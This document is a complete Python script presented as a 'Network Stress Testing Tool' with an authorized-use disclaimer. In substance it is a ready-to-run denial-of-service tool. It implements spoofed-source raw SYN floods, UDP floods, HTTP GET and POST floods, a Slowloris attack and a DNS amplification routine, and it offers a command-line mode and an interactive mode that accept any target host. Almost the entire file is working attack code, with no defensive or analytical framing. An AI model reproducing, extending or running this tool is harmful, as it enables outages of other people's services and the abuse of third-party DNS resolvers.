#!/usr/bin/env python3
"""
Network Stress Testing Tool v2.1
Single-file complete edition with interactive mode
For authorized security testing only
"""

import socket
import threading
import random
import time
import sys
import argparse
import struct
import os


class PacketCrafting:
    """Raw packet crafting for spoofed attacks"""
    
    @staticmethod
    def checksum(msg):
        """Calculate TCP/IP checksum"""
        if len(msg) % 2:
            msg += b'\0'
        s = sum(struct.unpack('!%dH' % (len(msg) // 2), msg))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    @staticmethod
    def create_syn_packet(src_ip, src_port, dst_ip, dst_port, seq_num):
        """Create a raw TCP SYN packet with IP header"""
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP Header
        tcp_seq = seq_num
        tcp_ack_seq = 0
        tcp_doff = 5 << 4
        tcp_flags = 0x02
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_doff, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for TCP checksum
        psh = struct.pack('!4s4sBBH',
            ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header))
        psh = psh + tcp_header
        
        tcp_check = PacketCrafting.checksum(psh)
        
        tcp_header = struct.pack('!HHLLBBH',
            src_port, dst_port, tcp_seq, tcp_ack_seq,
            tcp_doff, tcp_flags, tcp_window) + \
            struct.pack('H', tcp_check) + \
            struct.pack('!H', tcp_urg_ptr)
        
        return ip_header + tcp_header


class DoSTester:
    """Main DoS testing class with all attack methods"""
    
    def __init__(self, target, port, threads=100, spoof_ip=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.spoof_ip = spoof_ip
        self.packet_count = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.raw_socket = None
        
        if self.spoof_ip:
            try:
                self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                print(f"[+] Raw socket initialized - spoofing as {spoof_ip}")
            except PermissionError:
                print("[-] Raw sockets require root/admin privileges")
                print("[-] Falling back to standard SYN flood")
                self.raw_socket = None
                self.spoof_ip = None
    
    def syn_flood(self, spoofed=False):
        """TCP SYN Flood"""
        while not self.stop_event.is_set():
            try:
                if spoofed and self.raw_socket:
                    if self.spoof_ip == "random":
                        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    else:
                        src_ip = self.spoof_ip
                    
                    src_port = random.randint(1024, 65535)
                    seq_num = random.randint(0, 4294967295)
                    
                    packet = PacketCrafting.create_syn_packet(
                        src_ip, src_port, self.target, self.port, seq_num
                    )
                    self.raw_socket.sendto(packet, (self.target, 0))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.target, self.port))
                    s.close()
                
                with self.lock:
                    self.packet_count += 1
                    if self.packet_count % 100 == 0:
                        mode = "SPOOFED-SYN" if spoofed else "SYN"
                        print(f"[{mode}] Packets sent: {self.packet_count}")
            except:
                pass
    
    def udp_flood(self):
        """UDP Flood"""
        data = random._urandom(65507)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while not self.stop_event.is_set():
            try:
                target_port = self.port if random.random() > 0.3 else random.randint(1, 65535)
                sock.sendto(data, (self.target, target_port))
                
                with self.lock:
                    self.packet_count += 1
                    if self.packet_count % 1000 == 0:
                        print(f"[UDP] Packets sent: {self.packet_count}")
            except:
                pass
    
    def http_flood(self, use_post=False):
        """HTTP Flood"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        paths = ["/", "/index.html", "/home", "/api", "/login", "/search", "/product"]
        
        while not self.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target, self.port))
                
                path = random.choice(paths) + f"?id={random.randint(1,999999)}"
                ua = random.choice(user_agents)
                
                if use_post:
                    body = f"data={random.randint(10000,99999)}&value=test"
                    request = f"POST {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: {ua}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n"
                    request += f"Content-Length: {len(body)}\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                    request += body
                else:
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: {ua}\r\n"
                    request += "Accept: text/html,application/xhtml+xml\r\n"
                    request += "Accept-Language: en-US,en;q=0.5\r\n"
                    request += "Connection: keep-alive\r\n\r\n"
                
                s.send(request.encode())
                
                if random.random() > 0.7:
                    s.recv(1024)
                
                with self.lock:
                    self.packet_count += 1
                    if self.packet_count % 100 == 0:
                        method_type = "POST" if use_post else "GET"
                        print(f"[HTTP-{method_type}] Requests sent: {self.packet_count}")
                
                s.close()
            except:
                pass
    
    def slowloris(self):
        """Slowloris attack"""
        sockets = []
        
        print("[Slowloris] Establishing connections...")
        
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US\r\n".encode())
                sockets.append(s)
            except:
                pass
        
        print(f"[Slowloris] {len(sockets)} connections established")
        
        while not self.stop_event.is_set():
            for s in list(sockets):
                try:
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    with self.lock:
                        self.packet_count += 1
                except:
                    sockets.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(4)
                        new_s.connect((self.target, self.port))
                        new_s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                        new_s.send(f"Host: {self.target}\r\n".encode())
                        sockets.append(new_s)
                    except:
                        pass
            
            if self.packet_count % 100 == 0:
                print(f"[Slowloris] Active: {len(sockets)}, Headers: {self.packet_count}")
            
            time.sleep(10)
    
    def dns_amplification(self, dns_server="8.8.8.8"):
        """DNS amplification"""
        tid = random.randint(0, 65535).to_bytes(2, 'big')
        flags = b'\x01\x00'
        questions = b'\x00\x01'
        answer_rrs = b'\x00\x00'
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        query = b'\x07example\x03com\x00'
        qtype = b'\x00\xff'
        qclass = b'\x00\x01'
        
        packet = tid + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        
        print(f"[DNS-Amp] Sending queries to {dns_server}...")
        
        while not self.stop_event.is_set():
            try:
                sock.sendto(packet, (dns_server, 53))
                with self.lock:
                    self.packet_count += 1
                    if self.packet_count % 100 == 0:
                        print(f"[DNS-Amp] Queries sent: {self.packet_count}")
                time.sleep(0.01)
            except:
                pass
    
    def start_attack(self, method):
        """Launch threads"""
        print(f"\n[*] Starting {method.upper()} attack on {self.target}:{self.port}")
        print(f"[*] Threads: {self.threads}")
        if self.spoof_ip:
            print(f"[*] Spoofing: {self.spoof_ip}")
        print("[*] Press Ctrl+C to stop\n")
        
        thread_list = []
        
        for i in range(self.threads):
            if method == "syn":
                t = threading.Thread(target=self.syn_flood, args=(False,))
            elif method == "syn-spoof":
                if not self.spoof_ip:
                    print("[-] Spoofing not available, using standard SYN flood")
                    t = threading.Thread(target=self.syn_flood, args=(False,))
                else:
                    t = threading.Thread(target=self.syn_flood, args=(True,))
            elif method == "udp":
                t = threading.Thread(target=self.udp_flood)
            elif method == "http":
                t = threading.Thread(target=self.http_flood, args=(False,))
            elif method == "http-post":
                t = threading.Thread(target=self.http_flood, args=(True,))
            elif method == "slowloris":
                if i < 10:
                    t = threading.Thread(target=self.slowloris)
                else:
                    continue
            elif method == "dns":
                if i < 5:
                    t = threading.Thread(target=self.dns_amplification)
                else:
                    continue
            else:
                print("[-] Invalid method")
                return
            
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            self.stop_event.set()
            for t in thread_list:
                t.join(timeout=2)
            print(f"[+] Total packets/requests sent: {self.packet_count}")


def validate_target(target):
    """Validate and resolve target"""
    try:
        socket.inet_aton(target)
        return target
    except socket.error:
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            print(f"[-] Could not resolve {target}")
            return None


def interactive_mode():
    """Interactive mode for double-click users"""
    print("\n" + "=" * 50)
    print("   Network Stress Testing Tool v2.1")
    print("=" * 50)
    print("\n[!] For authorized testing only!")
    print("[*] Enter attack parameters:\n")
    
    target = input("Target IP/hostname: ").strip()
    if not target:
        print("[-] No target specified!")
        return None, None, None, None, None
    
    port_input = input("Port [80]: ").strip()
    port = int(port_input) if port_input else 80
    
    print("\nAvailable methods:")
    print("  syn       - TCP SYN flood")
    print("  syn-spoof - SYN flood with IP spoofing (requires root)")
    print("  udp       - UDP flood")
    print("  http      - HTTP GET flood")
    print("  http-post - HTTP POST flood")
    print("  slowloris - Slow HTTP connections")
    print("  dns       - DNS amplification")
    
    method = input("Method [http]: ").strip()
    if not method:
        method = "http"
    
    threads_input = input("Threads [100]: ").strip()
    threads = int(threads_input) if threads_input else 100
    
    spoof = None
    if method == "syn-spoof":
        spoof = input("Spoof IP (or 'random'): ").strip()
        if not spoof:
            spoof = "random"
    
    return target, port, method, threads, spoof


def main():
    """Main function"""
    # Check command line arguments
    if len(sys.argv) > 1:
        # Command line mode
        parser = argparse.ArgumentParser(description='Network Stress Testing Tool')
        parser.add_argument('target', help='Target IP or hostname')
        parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
        parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads')
        parser.add_argument('-m', '--method', 
                           choices=['syn', 'syn-spoof', 'udp', 'http', 'http-post', 'slowloris', 'dns'],
                           default='http', help='Attack method')
        parser.add_argument('-s', '--spoof', dest='spoof_ip', help='Spoof source IP')
        
        args = parser.parse_args()
        target, port, method, threads, spoof_ip = args.target, args.port, args.method, args.threads, args.spoof_ip
    else:
        # Interactive mode
        result = interactive_mode()
        if result == (None, None, None, None, None):
            return
        target, port, method, threads, spoof_ip = result
    
    # Validate target
    target_ip = validate_target(target)
    if not target_ip:
        return
    
    # Show banner
    print(f"\n{'=' * 50}")
    print(f"Target:  {target} ({target_ip})")
    print(f"Port:    {port}")
    print(f"Method:  {method}")
    print(f"Threads: {threads}")
    print(f"{'=' * 50}\n")
    
    # Initialize and start
    tester = DoSTester(target_ip, port, threads, spoof_ip)
    
    try:
        tester.start_attack(method)
    except Exception as e:
        print(f"\n[!] Error: {e}")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        pass
    except Exception as e:
        print(f"\n[!] Fatal Error: {e}")
        import traceback
        traceback.print_exc()
    
    # Keep window open
    if os.name == 'nt':
        print("\n" + "=" * 50)
        input("[*] Press Enter to exit...")